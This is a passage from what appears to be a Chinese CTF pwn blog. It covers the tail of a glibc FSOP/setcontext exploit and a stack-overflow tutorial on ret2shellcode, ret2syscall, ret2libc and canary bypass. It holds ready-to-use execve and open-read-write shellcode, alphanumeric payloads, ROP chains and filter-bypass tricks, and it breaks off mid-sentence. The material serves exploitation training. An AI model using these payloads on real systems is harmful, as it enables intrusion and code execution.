class="number">0x1d1040</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">  <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">  fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>;  <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>)fake_wide_data;  <span class="comment">// _wide_data</span></span><br><span class="line">  fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">  fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>)fake_put_stream; <span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">  fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>)write_base; <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">  fake_wide_data[<span class="number">4</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)write_base + <span class="number">0x80</span> * <span class="number">4</span>; <span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">  fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>; <span class="comment">// _flags</span></span><br><span class="line">  fake_put_stream[<span class="number">1</span>] =</span><br><span class="line">      (<span class="type">size_t</span>)&amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;               <span class="comment">// _IO_read_ptr -&gt; &amp;ucontext - 1</span></span><br><span class="line">  fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;  <span class="comment">// _IO_write_base</span></span><br><span class="line">  fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;         <span class="comment">// _IO_write_ptr</span></span><br><span class="line">  fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;  <span class="comment">// _IO_write_end</span></span><br><span class="line">  fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_buf_base</span></span><br><span class="line">  fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>)<span class="number">-1</span>;              <span class="comment">// _IO_buf_end</span></span><br><span class="line">  fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">  fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;      <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">  write_base[<span class="number">0</span>] = (<span class="type">size_t</span>)setcontext;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;write_base[<span class="number">1</span>], <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(fake_ucontext, <span class="number">0</span>, <span class="number">968</span>);</span><br><span class="line">  <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x2aa82</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x34bfa</span>;</span><br><span class="line">  <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x41f13</span>;</span><br><span class="line">  <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x85596</span>;</span><br><span class="line">  <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  fake_ucontext[<span class="number">13</span>] = (<span class="type">size_t</span>)&amp;write_base[<span class="number">1</span>]; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">  fake_ucontext[<span class="number">14</span>] = <span class="number">0</span>;                      <span class="comment">// rsi = 0</span></span><br><span class="line">  fake_ucontext[<span class="number">17</span>] = <span class="number">0x100</span>;                  <span class="comment">// edx = 0x100</span></span><br><span class="line">  fake_ucontext[<span class="number">20</span>] = (<span class="type">size_t</span>)rop;            <span class="comment">// rsp -&gt; rop</span></span><br><span class="line">  fake_ucontext[<span class="number">21</span>] = ret;                    <span class="comment">// rip -&gt; ret</span></span><br><span class="line">  fake_ucontext[<span class="number">28</span>] = (<span class="type">size_t</span>)large + <span class="number">0x1500</span>; <span class="comment">// fpregs -&gt; rw memory</span></span><br><span class="line"></span><br><span class="line">  rop[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  rop[<span class="number">2</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">3</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  rop[<span class="number">5</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">6</span>] = <span class="number">3</span>;</span><br><span class="line">  rop[<span class="number">7</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">8</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">9</span>] = syscall_ret;</span><br><span class="line">  rop[<span class="number">10</span>] = pop_rax_ret;</span><br><span class="line">  rop[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">12</span>] = pop_rdi_ret;</span><br><span class="line">  rop[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">  rop[<span class="number">14</span>] = pop_rsi_ret;</span><br><span class="line">  rop[<span class="number">15</span>] = (<span class="type">size_t</span>)write_base;</span><br><span class="line">  rop[<span class="number">16</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// FSOP</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux 栈溢出</title>
    <url>/2024/11/08/linux-stack-overflow/</url>
    <content><![CDATA[<h1 id="逻辑漏洞">逻辑漏洞</h1>
<p>栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。 # ret2text</p>
<p>栈溢出覆盖返回地址为后门函数从而获取shell。</p>
<h1 id="ret2shellcode">ret2shellcode</h1>
<p>将shellcode写入可执行的内存地址处，然后栈溢出覆盖返回地址到shellcode从而执行shellcode获取shell。
测试 shellcode 例题：</p>
<ul>
<li><p>32位例题：wdb_2018_3rd_soEasy</p></li>
<li><p>64位例题：ciscn_2019_n_5</p></li>
</ul>
<h2 id="手写">手写</h2>
<ul>
<li><p>32位</p>
<ul>
<li><p>shell（21字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
<li><p>orw（56字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>无 <code>\x00</code> 截断版（21字节） <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure></div> scanf
可读取版（41字节） <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure></div></p></li>
</ul></li>
<li><p>64位</p>
<ul>
<li><p>shell（22字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>无 <code>\x00</code> 截断且 scanf 可读版（22字节）
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>orw（43字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>某些题目还会禁用 SYS_open ，需要用 SYS_openat 代替。
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, -100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 257 ;// SYS_openat</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 123 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div></p></li>
</ul></li>
</ul>
<h2 id="pwntools-生成">pwntools 生成</h2>
<ul>
<li><p>shell（32位44字节，64位48字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></div></li>
<li><p>orw</p>
<ul>
<li><p>32位（55字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div></li>
<li><p>64位（66字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div>
<h2 id="纯-ascii-码-shellcode">纯 ascii 码 shellcode</h2>
<p><a class="link"   href="https://github.com/TaQini/alpha3" >alpha3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
项目可以实现可见 shellcode 。 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>)</span><br><span class="line">fp.write(asm(shellcraft.sh()))</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">shellcode = os.popen(<span class="string">&quot;python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode</span><br></pre></td></tr></table></figure></div> <strong>注意：alpha3 生成
shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode
的地址。设置为其他寄存器同理。</strong></p></li>
</ul></li>
<li><p>32 位（70字节，eax）</p>
<p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>64 位（105字节，rax）</p>
<p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W</span><br></pre></td></tr></table></figure></div></p></li>
<li><p>64 位（271字节，rdi） <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F110M130y120c102n102q141N117K110a122k112H102O17031709102Z172q102q122L162L110e120S102u121N107o00</span><br></pre></td></tr></table></figure></div></p></li>
</ul>
<h2 id="x00-截断"><code>\x00</code> 截断</h2>
<p>对于过滤 shellcode 的题目一般是采用 strlen 获取
shellcode长度，因此可以在shellcode前加一个以 <code>\x00</code>
开头的指令来绕过对 shellcode 的过滤。</p>
<p>64 位的指令如下，32 位的话寄存器会改下名，opcode 不变。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">40</span> <span class="number">00</span>                 add    BYTE PTR [rax+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">41</span> <span class="number">00</span>                 add    BYTE PTR [rcx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">42</span> <span class="number">00</span>                 add    BYTE PTR [rdx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">43</span> <span class="number">00</span>                 add    BYTE PTR [rbx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">45</span> <span class="number">00</span>                 add    BYTE PTR [rbp+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">46</span> <span class="number">00</span>                 add    BYTE PTR [rsi+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">47</span> <span class="number">00</span>                 add    BYTE PTR [rdi+<span class="number">0x0</span>],  al</span><br></pre></td></tr></table></figure></div></p>
<h2 id="测试-shellcode">测试 shellcode</h2>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -zexecstack -g -m32 -o shellcode-test shellcode-test.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> shellcode[]=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;</span>;</span><br><span class="line">	<span class="built_in">void</span>(*run)()=(<span class="built_in">void</span>(*)())shellcode;</span><br><span class="line">	<span class="built_in">run</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="ret2syscall">ret2syscall</h1>
<p>构造rop链模拟系统调用过程</p>
<p><code>ROPgadget</code>有时可自动构造，但可能长度过长，建议手动构造。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget.py --binary ./pwn --ropchain</span><br></pre></td></tr></table></figure></div>
<p><code>ROPgadget</code>检索相关指令举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure></div>
<p><code>ropper</code> 检索 gadget 举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div>
<p>注意： - rax/eax
寄存器通常用来存储返回值，因此可以通过控制返回值来控制 rax/eax
寄存器，不一定需要 gadget。例如 alarm 函数每次会返回上一次设置的 alarm
的剩余时间，特别的，第一次会返回 0。因此可以通过栈溢出反复调用 alarm
并控制交互时间来控制 eax 寄存器的值。 - 可以通过 ret2csu 来控制寄存器。
- 如果寄存器不好控制可以考虑 SROP 。 - 如果缺少
<code>syscall; ret;</code> 可以考虑将题目中的 <code>alarm@got</code>
中的内容通过 rop（例如
<code>add byte ptr [rdi], al; ret;</code>）加一个偏移，这样
<code>alarm@plt</code> 就可以当做 <code>syscall; ret;</code> 使用。 ##
32位</p>
<ul>
<li>eax = 0x0b</li>
<li>ebx指向<code>"/bin/sh"</code></li>
<li>ecx = 0x0</li>
<li>edx = 0x0</li>
</ul>
<p>rop示例： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0386c58178b9c5d125f63daaba1d0ab2.png"
                     
alt="图片" 
                > ## 64位</p>
<ul>
<li>rax = 0x3b</li>
<li>rdi指向<code>"/bin/sh"</code></li>
<li>rsi = 0x0</li>
<li>rdx = 0x0</li>
</ul>
<p>rop示例： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/513d283d1e58ea87558b0a1c7be5f06a.png"
                     
alt="图片" 
                > # ret2libc ## linux延迟绑定机制</p>
<p>动态链接每个函数需要两个东西：</p>
<ul>
<li><p>用来存放外部函数地址的数据段</p></li>
<li><p>用来获取数据段记录的外部函数地址的代码</p></li>
</ul>
<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>,
Global Offset
Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure
Link Table）</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/71e04df6969db4f75dcf43f09246a92b.png"
                      alt="图片" 
                >
<figcaption aria-hidden="true">图片</figcaption>
</figure>
<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT
的地址，GOT 表指向的就是 glibc 中的地址。</p>
<p>在这里面想要通过 plt 表获取函数的地址，首先要保证 got
表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux
引入了延迟绑定机制：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>举例：</p>
<p>第一次调用 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5dfa1cfa3febe69de060b44636b1d515.png"
                     
alt="在这里插入图片描述" 
                > 之后再次调用</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c1fdf7342f4974e396840a515fd5cafe.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h2 id="利用过程">利用过程</h2>
<h3 id="泄露函数地址">泄露函数地址</h3>
<p>泄露libc函数地址的条件：程序中有输出函数，例如puts/printf/write</p>
<p>以<code>write(1,buf,20)</code>为例：</p>
<ul>
<li><p>32位</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/467d83f627ee475bff7982574983ebbb.png"
                     
alt="image-20220201201536794" 
                >
<figcaption aria-hidden="true">image-20220201201536794</figcaption>
</figure></li>
<li><p>64位</p>
<p>需要控制三个参数，rdi，rsi，rdx</p>
<p>第三个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓。</p></li>
</ul>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d0960c383618941fa65bf62b257c8f79.png"
                     
alt="在这里插入图片描述" 
                >
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<p>截取泄露的函数地址</p>
<ul>
<li><p>32位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div></li>
<li><p>64位</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></div></li>
<li><p>特别得，对于printf输出数字结果，不需要小端序转换，<code>[:-1]</code>是为了去掉最后的回车</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>### 获取libc基址</p>
<ul>
<li><p>LibcSearcher</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
<li><p>ELF</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.symbol[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">ayatem_addr = libc_base + libc.symbol[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>### 构造rop获取shell</p>
<p>system函数调用过程。</p>
<p>另外，可以<code>one_gadget</code>查找已知的libc中<code>exevce("/bin/sh")</code>语句的地址。</p>
<p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">one_gadget libc-2.23.so</span></span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure></div> # canary 绕过 ## 泄露canary - 利用栈溢出泄露canary
canary 以 <code>\x00</code> 结尾，通过栈溢出覆盖 canary
最低字节，之后输出输入内容时会连带将 canary 一同输出。 -
利用格式化字符串漏洞泄露 canary。</p>
<pre><code>由于 canary 存储在栈上，因此很容易就可以利用格式化字符串漏洞泄露。</code></pre>
<h2 id="逐字节爆破">逐字节爆破</h2>
<p>例如下面的程序： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="type">pid_t</span> id = fork();</span><br><span class="line">	<span class="keyword">if</span>(id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id) &#123;</span><br><span class="line">		<span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">vuln</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 由于 <strong>fork 产生的子进程的
canary
与父进程相同</strong>，因此可以根据子进程是否打印报错信息来逐字节爆破
canary 。 ## 劫持 __stack_chk_failed 函数 canary 检测失败会调用
